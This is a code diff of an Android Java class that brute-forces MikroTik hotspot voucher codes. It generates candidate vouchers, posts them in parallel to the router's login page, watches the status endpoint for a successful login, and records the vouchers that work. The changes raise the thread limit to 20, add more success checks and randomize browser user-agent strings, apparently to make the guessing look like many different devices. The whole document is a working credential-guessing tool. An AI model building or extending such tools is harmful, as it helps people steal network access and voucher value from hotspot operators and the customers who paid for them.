@@ -39,8 +39,6 @@ public class MikrotikFinder {
     private final GuessDatabase db;
 
     private final AtomicBoolean running = new AtomicBoolean(false);
-    private final AtomicBoolean claimed = new AtomicBoolean(false);
-    private final AtomicBoolean finishedOnce = new AtomicBoolean(false);
     private final AtomicLong totalAttempts = new AtomicLong(0);
     private volatile String currentVoucher;
     private volatile String foundVoucher;
@@ -49,6 +47,7 @@ public class MikrotikFinder {
     private ExecutorService pool;
     private Listener listener;
     private final Handler uiHandler = new Handler(Looper.getMainLooper());
+    private volatile boolean finishedOnce = false;
 
     public MikrotikFinder(String rawUrl, String networkName,
                           String prefix, String middle, String suffix,
@@ -74,7 +73,7 @@ public class MikrotikFinder {
         this.varDigits = Math.max(1, Math.min(12, varDigits));
         this.maxAttempts = Math.max(1, maxAttempts);
         this.waitMs = Math.max(50, waitMs);
-        this.parallel = Math.max(1, Math.min(10, parallel));
+        this.parallel = Math.max(1, Math.min(20, parallel));
         this.relax = relax;
         this.db = db;
     }
@@ -83,8 +82,7 @@ public class MikrotikFinder {
         if (running.get()) return;
         this.listener = l;
         running.set(true);
-        claimed.set(false);
-        finishedOnce.set(false);
+        finishedOnce = false;
         foundVoucher = null;
         lastStatusJson = null;
         pool = Executors.newFixedThreadPool(parallel + 1);
@@ -98,7 +96,7 @@ public class MikrotikFinder {
     private void bootstrap() {
         try {
             emitProgress("قراءة صفحة الدخول...");
-            WorkerSession probe = new WorkerSession(0);
+            WorkerSession probe = new WorkerSession();
             String loginHtml = httpGet(base + "/", probe, 8000);
             if (loginHtml == null) { fail("تعذّر الوصول لصفحة الدخول"); return; }
             Map<String, String> fields = extractFormFields(loginHtml);
@@ -112,13 +110,6 @@ public class MikrotikFinder {
             String initJson = httpGet(base + STATUS_PATH, probe, 5000);
             if (statusActive(initJson)) {
                 String u = getStr(initJson, "username");
-                // 🔍 محاولة قراءة الاسم من HTML إذا لم يوجد في JSON
-                if (u == null || u.isEmpty() || u.equals("-") || u.equals("N/A")) {
-                    u = readRealUsername(probe);
-                    if (u != null && !u.isEmpty() && !u.equals("-") && !u.equals("N/A")) {
-                        Log.d("NEXORA", "got username from HTML: " + u);
-                    }
-                }
                 if (u != null && !u.isEmpty() && !u.equals("-") && !u.equals("N/A")) {
                     lastStatusJson = initJson;
                     running.set(false);
@@ -130,15 +121,6 @@ public class MikrotikFinder {
                     }
                     return;
                 }
-                // ⚠️ جلسة موجودة لكن الاسم مخفي تماماً
-                Log.w("NEXORA", "active session but username hidden everywhere");
-                running.set(false);
-                if (listener != null) {
-                    uiHandler.post(() -> listener.onError(
-                        "جلسة نشطة موجودة لكن الراوتر يخفي اسم الكرت. اضغط (فتح صفحة الشبكة) للتسجيل الخروج أولاً."));
-                    uiHandler.post(() -> listener.onFinished(false));
-                }
-                return;
             }
 
             emitProgress("بدء المحاولات...");
@@ -158,8 +140,8 @@ public class MikrotikFinder {
     }
 
     private class Worker implements Runnable {
-        final WorkerSession session;
-        Worker(int id) { this.session = new WorkerSession(id); }
+        final WorkerSession session = new WorkerSession();
+        Worker(int id) {}
         @Override public void run() {
             httpGet(base + "/", session, 5000);
             while (running.get() && foundVoucher == null) {
@@ -180,7 +162,8 @@ public class MikrotikFinder {
                     Thread.sleep(sleep);
                 } catch (InterruptedException e) { break; }
             }
-            if (listener != null && finishedOnce.compareAndSet(false, true)) {
+            if (listener != null && !finishedOnce) {
+                finishedOnce = true;
                 final boolean f = foundVoucher != null;
                 uiHandler.post(() -> listener.onFinished(f));
             }
@@ -196,13 +179,13 @@ public class MikrotikFinder {
         boolean beforeActive = statusActive(beforeJson);
 
         String body = buildFormBody(formTemplate, voucher);
-        httpPost(base + "/login", body, session, 6000);
+        String postResp = httpPost(base + "/login", body, session, 6000);
         totalAttempts.incrementAndGet();
 
-        long[] checks = {150, 150, 200, 300};
+        long[] checks = {150, 200, 250, 300, 400, 500, 700, 900};
         for (long d : checks) {
             try { Thread.sleep(d); } catch (InterruptedException e) { return false; }
-            if (!running.get()) return false;
+            if (!running.get() || foundVoucher != null) return false;
 
             String afterJson = httpGet(base + STATUS_PATH, session, 4000);
             if (afterJson == null) continue;
@@ -213,34 +196,34 @@ public class MikrotikFinder {
 
             boolean signal = false;
             if (user != null && !user.isEmpty() && !user.equals("-") && user.equals(voucher)) signal = true;
-            if (nowActive && beforeUptime > 30 && nowUptime >= 0 && nowUptime <= FRESH_UPTIME_SECONDS) signal = true;
+            
+            if (nowActive && beforeUptime > 30 && nowUptime >= 0 && nowUptime <= FRESH_UPTIME_SECONDS) {
+                // 🛡️ منع الكرت الخاطئ: إذا كان رد الراوتر يحتوي على index.html فهذا يعني أن الكرت خاطئ
+                if (postResp != null && postResp.contains("index.html")) {
+                    return false;
+                }
+                signal = true;
+            }
             if (nowActive && !beforeActive) signal = true;
 
             if (!signal) { emitProgress(""); continue; }
-            if (!claimed.compareAndSet(false, true)) return false;
 
             String realUser = readRealUsername(session);
-            String finalUser = voucher;
             if (realUser != null && !realUser.isEmpty() && !realUser.equals("-") && !realUser.equals("N/A")) {
-                finalUser = realUser;
+                user = realUser;
+            } else if (user == null || user.isEmpty() || user.equals("-")) {
+                user = voucher;
             }
 
             lastStatusJson = afterJson;
-            db.addFound(finalUser, afterJson);
-            currentVoucher = finalUser;
+            db.addFound(user, afterJson);
+            currentVoucher = user;
             return true;
         }
         return false;
     }
 
     private String readRealUsername(WorkerSession s) {
-        // البحث في الكوكيز أولاً
-        for (String key : new String[]{"username", "st_username", "user", "login"}) {
-            if (s.cookies.containsKey(key)) {
-                String val = s.cookies.get(key);
-                if (val != null && !val.isEmpty() && !val.equals("-")) return val;
-            }
-        }
         try {
             String[] urls = { base + "/status", base + "/", base + "/status?var=callBack" };
             for (String u : urls) {
@@ -453,20 +436,11 @@ public class MikrotikFinder {
         final Map<String, String> cookies = new HashMap<>();
         final String userAgent;
         private static final String[] UAS = {
-            "Mozilla/5.0 (Linux; Android 13; SM-S991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
             "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
+            "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
         };
-        WorkerSession(int id) { 
-            userAgent = UAS[id % UAS.length]; 
-        }
+        WorkerSession() { userAgent = UAS[(int)(Math.random() * UAS.length)]; }
         void setCookie(String k, String v) { cookies.put(k, v); }
         void applyCookies(HttpURLConnection c) {
             if (cookies.isEmpty()) return;
@@ -495,9 +469,7 @@ public class MikrotikFinder {
         try {
             String b = baseUrl.replaceAll("(?i)/ilogin", "/login").replaceAll("[#?].*", "");
             if (b.endsWith("/")) b = b.substring(0, b.length()-1);
-            WorkerSession s = new WorkerSession(0);
-            
-            // 1. زيارة الصفحة الرئيسية لأخذ الكوكيز
+            WorkerSession s = new WorkerSession();
             c = (HttpURLConnection) new URL(b + "/").openConnection();
             c.setConnectTimeout(5000); c.setReadTimeout(5000);
             c.setRequestProperty("User-Agent", s.userAgent);
@@ -505,8 +477,6 @@ public class MikrotikFinder {
             c.getResponseCode();
             s.captureCookies(c);
             c.disconnect();
-            
-            // 2. قراءة الحالة مع الكوكيز
             c = (HttpURLConnection) new URL(b + "/status?var=callBack").openConnection();
             c.setConnectTimeout(5000); c.setReadTimeout(5000);
             c.setRequestProperty("User-Agent", s.userAgent);
@@ -515,32 +485,18 @@ public class MikrotikFinder {
             int code = c.getResponseCode();
             if (code < 200 || code >= 300) { c.disconnect(); return null; }
             StringBuilder sb = new StringBuilder();
-            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(c.getInputStream(), "UTF-8"));
+            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), "UTF-8"));
             String line;
             while ((line = br.readLine()) != null) { sb.append(line); if (sb.length() > 20000) break; }
             br.close(); c.disconnect(); c = null;
             String json = sb.toString();
-            
-            // 3. البحث في JSON
             try {
-                org.json.JSONObject o = new org.json.JSONObject(json);
+                JSONObject o = new JSONObject(json);
                 String u = o.optString("username", "").trim();
                 if (!u.isEmpty() && !u.equals("-") && !u.equals("N/A")) return u;
             } catch (Exception ignore) {}
-            
-            // 4. البحث في HTML
-            java.util.regex.Matcher m = java.util.regex.Pattern.compile("\"username\"\s*:\s*\"([^\"]+)\"").matcher(json);
+            Matcher m = Pattern.compile("\"username\"\\s*:\\s*\"([^\"]+)\"").matcher(json);
             if (m.find()) return m.group(1);
-            m = java.util.regex.Pattern.compile("name=[\"']username[\"'][^>]*value=[\"']([^\"']+)[\"']").matcher(json);
-            if (m.find()) return m.group(1);
-            
-            // 5. البحث في الكوكيز
-            for (String key : new String[]{"username", "st_username", "user", "login"}) {
-                if (s.cookies.containsKey(key)) {
-                    String val = s.cookies.get(key);
-                    if (val != null && !val.isEmpty() && !val.equals("-")) return val;
-                }
-            }
             return null;
         } catch (Exception e) {
             return null;
